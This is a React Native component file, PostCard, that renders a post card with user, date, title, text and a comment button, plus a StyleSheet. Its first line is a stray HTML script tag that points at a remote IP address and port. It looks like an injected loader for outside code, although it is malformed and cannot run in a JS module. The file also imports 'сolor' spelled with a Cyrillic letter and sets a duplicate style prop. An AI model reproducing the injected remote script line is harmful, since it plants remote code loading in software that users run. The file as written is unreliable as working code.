<script scr="http.//10.6.182.136:8097"></script>

import React, { Component } from 'react';
import { Ionicons } from '@expo/vector-icons';
import { View, TouchableOpacity, StyleSheet } from 'react-native';
import { Container, Header, Content, Card, CardItem, Text, Icon, Left, Body, Right } from 'native-base';
//import ModalWindow from './Modal',
import Modal from 'react-native-modal';


import сolor from '../constants/Colors';

class PostCard extends React.Component {
    constructor(props) {
        super(props);
        this.state = {
            data: props.posts,
            visibleModal: false, // for modal
        };
    }

 

    render() {
        return (
            <Container style={styles.containerCard}>
                <Content style={styles.contentCard}>
                    <Card style={styles.card}>
                        <CardItem style={styles.cardItem}>
                            <Ionicons style={styles.userIcon} name='md-aperture' size={26} />
                            <Body>
                                <Text>{this.props.user}</Text>
                                <Text note>{this.props.date}</Text>
                            </Body>
                            <Right>
                                <TouchableOpacity
                                    // onPress = {() => {this.setState({ visibleModal: true})}}
                                    // in parameter send props about each card to delete 
                                    onPress={() => this.props.openModal(this.props)}
                                    hitSlop={{ top: 10, bottom: 10, left: 10, right: 10 }}>
                                    <Ionicons name='md-more' size={22} />
                                </TouchableOpacity>
                            </Right>
                        </CardItem>
                        <CardItem header>
                            <Text style={styles.titleText}>{this.props.title}</Text>
                        </CardItem>

                        <CardItem bordered>
                            <Body>
                                <Text>{this.props.text}</Text>
                            </Body>
                        </CardItem>

                        <CardItem bordered>
                            <Right>
                                <TouchableOpacity style={styles.commentContainer} onPress={() => alert("Add comment later")}>
                                    <Ionicons style={styles.commentIcon} name='md-albums' style={{ color: '#ED4A6A' }} size={20} />
                                    <Text style={styles.commentText}>Comment</Text>
                                </TouchableOpacity>
                            </Right>
                        </CardItem>
                    </Card>
                </Content>
            </Container>
        );
    }
}


const styles = StyleSheet.create({
    containerCard: {
        //flex: 1,
        flexDirection: 'row',
        marginTop: 30,
    },

    contentCard: {
        //flexDirection: 'row',
        //flexDirection: 'column-reverse'
    },

    card: {

    },

    userIcon: {
        marginRight: 10
    },
    titleText: {
        fontSize: 20,
        paddingBottom: 0,
        paddingTop: 0
    },
    commentContainer: {
        flexDirection: 'row',
        alignItems: 'center',
        textAlign: 'justify',
    },
    commentText: {
        marginLeft: 10,
        justifyContent: 'flex-end'
    },
    commentIcon: {
        justifyContent: 'flex-end'

    },
    modalBox: {
        width: 50,
        height: 50
    }


});

export default PostCard;


// https://docs.nativebase.io/Components.html#card-list-headref